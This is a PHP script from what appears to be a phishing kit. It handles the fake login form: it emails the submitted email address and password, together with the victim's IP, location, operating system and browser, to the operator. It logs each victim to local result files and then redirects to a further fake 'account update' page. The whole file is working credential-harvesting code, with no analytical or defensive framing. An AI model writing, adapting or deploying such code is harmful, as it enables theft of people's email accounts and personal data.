<?php
session_start();
error_reporting(0);
include '../main.php';
if($_POST['email'] == "") {
	exit();
}
$subject = "EMAIL ACCESS: ".$_POST['email']." [ $cn - $os - $ip2 ]";

$message  = "#-------------------------[ EMAIL ACCESS ]-----------------------------#\n";
$message .= "Email			: ".$_POST['email']."\n";
$message .= "Password		: ".$_POST['password']."\n";
$message .= "#--------------------------[ PC INFORMATION ]--------------------------#\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "#--------------------------[ NEVER DIE ]-----------------------------#\n";

kirim_mail($to,"Email Access",$subject,$message);
$click = fopen("../result/total_email.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Login Email Access"."\n");
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
exit(); 
?>